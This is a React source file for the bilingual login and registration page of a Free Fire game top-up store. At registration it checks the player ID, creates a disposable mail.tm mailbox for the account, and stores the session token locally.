import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { Eye, EyeOff } from 'lucide-react';
import LoaderButton from '../components/LoaderButton';
import Modal from '../components/Modal';
import { useLanguage } from '../context/LanguageContext';

export default function LoginRegister() {
  const { t, language } = useLanguage();
  const [isLogin, setIsLogin] = useState(true);
  const [accountId, setAccountId] = useState('');
  const [password, setPassword] = useState('');
  const [level, setLevel] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [loadingStep, setLoadingStep] = useState('');
  const [error, setError] = useState('');
  const [banInfo, setBanInfo] = useState<{isOpen: boolean, msg: string}>({isOpen: false, msg: ''});
  
  const navigate = useNavigate();

  useEffect(() => {
    const token = localStorage.getItem('ff_token');
    if (token) {
      navigate('/charge');
    }
  }, [navigate]);

  const handleAuth = async () => {
    if (!accountId || !password) {
      setError(t('fill_required_data') || 'يرجى ملأ جميع الحقول');
      return;
    }
        

    if (accountId.trim().length < 3) {
      setError(isLogin
        ? (language === 'ar' ? 'الاسم أو معرّف اللاعب يجب أن يكون 3 أحرف على الأقل' : 'Name or Player ID must be at least 3 characters')
        : (language === 'ar' ? 'معرف اللاعب يجب أن يكون 3 أحرف على الأقل' : 'Player ID must be at least 3 characters')
      );
      return;
    }

    if (password.length < 8) {
      setError(language === 'ar' ? 'كلمة المرور يجب أن لا تقل عن 8 حروف' : 'Password must be at least 8 characters');
      return;
    }
    if (!/(?=.*[a-zA-Z])/.test(password)) {
      setError(language === 'ar' ? 'كلمة المرور يجب أن تحتوي على الأقل حرف أجنبي (a-z)' : 'Password must contain at least one English letter');
      return;
    }
    if (!/(?=.*\d)/.test(password)) {
      setError(language === 'ar' ? 'كلمة المرور يجب أن تحتوي على أرقام' : 'Password must contain numbers');
      return;
    }
    if (/\s/.test(password)) {
      setError(language === 'ar' ? 'يمنع استخدام المسافات في كلمة المرور' : 'Spaces are not allowed in the password');
      return;
    }
    if (!/^[a-zA-Z0-9@_.\-!#$%^&*()]+$/.test(password)) {
      setError(language === 'ar' ? 'يمنع استخدام الرموز التي تحدث مشاكل أو الحروف غير الإنجليزية' : 'Problematic symbols or non-English characters are not allowed');
      return;
    }

    setLoading(true);
    setError('');
    
    try {
      if (isLogin) {
          const reqBody: any = { account_id: accountId.trim(), password };
          const res = await axios.post('/api/login', reqBody);
          localStorage.setItem('ff_token', res.data.token);
          localStorage.setItem('ff_user', JSON.stringify(res.data.user));
          navigate('/charge');
      } else {
          setLoadingStep('verify');
          // 1. Check account in game
          let checkRes;
          try {
              checkRes = await axios.post('/api/check-account', { account_id: accountId.trim(), account_name: '' });
          } catch (err: any) {
              setError(err.response?.data?.message || (language === 'ar' ? 'فشل التحقق من الحساب' : 'Failed to verify account'));
              setLoading(false);
              setLoadingStep('');
              return;
          }

          setLoadingStep('email');
          // 2. Generate email
          const reqBody: any = { 
              account_id: accountId.trim(), 
              password,
              account_name: checkRes.data.account_name,
              level: checkRes.data.level, likes: checkRes.data.likes
          };

          try {
             const cleanName = accountId.trim().toString().toLowerCase().replace(/[^a-z0-9]/g, '') || 'user';
             const randomSuffix = Math.floor(1000 + Math.random() * 9000);
             const cleanUsername = `${cleanName}ff${randomSuffix}`;
             const tempPassword = Math.random().toString(36).slice(-12) + Math.random().toString(36).slice(-12);
             
             let email = `${cleanUsername}@web-library.net`;
             let createSuccess = false;
             
             try {
                await axios.post('/api/mailtm/accounts', { address: email, password: tempPassword });
                createSuccess = true;
             } catch(e: any) {
                // fallback
                try {
                   const domainsRes = await axios.get('/api/mailtm/domains');
                   if (domainsRes.data['hydra:member']?.length > 0) {
                      const fallbackDomain = domainsRes.data['hydra:member'][0].domain;
                      email = `${cleanUsername}@${fallbackDomain}`;
                      await axios.post('/api/mailtm/accounts', { address: email, password: tempPassword });
                      createSuccess = true;
                   }
                } catch (fallbackErr) {
                   console.warn("Mail.tm registration failed on fallback, using virtual email fallback.", fallbackErr);
                }
             }
             
             // Always set temp_email and temp_password (even if mail.tm creation fails, we use virtual email fallback so registration is not blocked)
             reqBody.temp_email = email;
             reqBody.temp_password = tempPassword;
          } catch (mailErr: any) {
             console.error("Mail creation failed", mailErr);
          }

          setLoadingStep('register');
          // 3. Register
          const res = await axios.post('/api/register', reqBody);
          localStorage.setItem('ff_token', res.data.token);
          localStorage.setItem('ff_user', JSON.stringify(res.data.user));
          navigate('/charge');
      }
    } catch (err: any) {
      if (err.response?.status === 403 && err.response?.data?.status === 'banned') {
        setBanInfo({ isOpen: true, msg: err.response.data.message });
      } else {
        setError(err.response?.data?.message || 'فشل في عملية الاتصال');
      }
    } finally {
      setLoading(false);
      setLoadingStep('');
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA] pb-20 font-sans" dir={language === 'ar' ? 'rtl' : 'ltr'}>
      <main className="mx-auto max-w-md px-4 pt-20">
        <div 
          className="rounded-2xl border border-gray-100 bg-white p-6 shadow-sm"
        >
          <div className="mb-6 text-center">
            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center overflow-hidden rounded-2xl border-2 border-red-600 p-0.5 shadow-md bg-white">
              <img
                src="https://storingo.lovestoblog.com/ff.png"
                alt="Free Fire"
                className="h-full w-full rounded-xl object-cover"
                onError={(e) =>
                  (e.currentTarget.src =
                    "https://play-lh.googleusercontent.com/NejsQExEa0ZqV4xOMr0HjWd2mK95P_k1Gq-U2xI2qXYR0z8C6rE8lQ6YIIf4rY1R3W8=w240-h480-rw")
                }
              />
            </div>
            <h1 className="mb-1 text-2xl font-black text-gray-900">متجر فري فاير</h1>
            <p className="text-sm text-gray-500">
              {isLogin ? t('login_to_start') : t('create_to_start')}
            </p>
          </div>

          {/* Modern Tabs */}
          <div className="mb-6 flex rounded-xl bg-gray-100 p-1">
            <button
              onClick={() => { setIsLogin(true); setError(''); }}
              className={`flex-1 rounded-lg py-2.5 text-sm font-bold transition-all outline-none ${isLogin ? 'bg-white text-red-600 shadow-sm' : 'text-gray-500 hover:text-gray-700'}`}
            >
              {t('login')}
            </button>
            <button
              onClick={() => { setIsLogin(false); setError(''); }}
              className={`flex-1 rounded-lg py-2.5 text-sm font-bold transition-all outline-none ${!isLogin ? 'bg-white text-red-600 shadow-sm' : 'text-gray-500 hover:text-gray-700'}`}
            >
              {t('register')}
            </button>
          </div>

          <div className="space-y-4">
            
            <div>
              <label className="mb-1.5 block text-sm font-bold text-gray-700">
                {isLogin 
                  ? (language === 'ar' ? 'الاسم أو معرف اللاعب (ID)' : 'Name or Player ID')
                  : (language === 'ar' ? 'معرف اللاعب (ID)' : 'Player ID')}
              </label>
              <input 
                type="text" 
                value={accountId}
                onChange={(e) => setAccountId(e.target.value)}
                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
                placeholder={isLogin 
                  ? (language === 'ar' ? "يرجى إدخال الاسم أو معرف اللاعب (ID)" : "Please enter your name or Player ID")
                  : (language === 'ar' ? "يرجى إدخال معرف اللاعب (ID)" : "Please enter your Player ID")}
              />
            </div>
            {!isLogin && (
              <div>
                <label className="mb-1.5 block text-sm font-bold text-gray-700">
                  {language === 'ar' ? 'بريد الخادم الخاص بك سيكون' : 'Your server email will be'}
                </label>
                <input 
                  type="email" 
                  readOnly
                  value={accountId ? `${accountId.trim().toString().toLowerCase().replace(/[^a-z0-9]/g, '')}ff@web-library.net` : ''}
                  className="w-full rounded-xl border border-gray-300 bg-gray-200 p-4 text-sm font-medium text-gray-700 outline-none transition-all cursor-not-allowed"
                  dir="ltr"
                />
              </div>
            )}
            <div>
              <label className="mb-1.5 block text-sm font-bold text-gray-700">{t('password')}</label>
              <div className="relative">
                <input 
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 pr-12 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 rtl:pl-12 rtl:pr-4"
                  placeholder="••••••••"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className={`absolute top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors ${language === 'ar' ? 'left-4' : 'right-4'}`}
                >
                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
              </div>
            </div>

            {error && <p className="text-center text-sm font-bold text-red-500">{error}</p>}

            <LoaderButton 
              isLoading={loading}
              loadingText={isLogin ? (language === 'ar' ? 'جاري الدخول...' : 'Logging in...') : (loadingStep === 'verify' ? (language === 'ar' ? 'جاري التحقق من الايدي...' : 'Verifying ID...') : (loadingStep === 'email' ? (language === 'ar' ? 'جاري إنشاء بريد...' : 'Creating email...') : (language === 'ar' ? 'جاري إنشاء الحساب...' : 'Creating account...')))}
              onClick={handleAuth}
              className="mt-2 w-full rounded-xl bg-red-600 py-4 text-lg font-bold text-white shadow-lg shadow-red-600/20 hover:bg-red-700 active:scale-95 transition-all transition-colors"
            >
              {isLogin ? t('login') : t('register')}
            </LoaderButton>
          </div>
        </div>
      </main>

      <Modal 
        isOpen={banInfo.isOpen} 
        onClose={() => setBanInfo({ ...banInfo, isOpen: false })}
        title="الحساب محظور!"
        type="error"
      >
        <div className="text-center">
          <p className="mb-6">{banInfo.msg}</p>
          <button 
            onClick={() => setBanInfo({ ...banInfo, isOpen: false })}
            className="w-full rounded-xl bg-gray-100 text-gray-900 py-3 font-bold hover:bg-gray-200 transition-colors"
          >
            إغلاق
          </button>
        </div>
      </Modal>

    </div>
  );
}
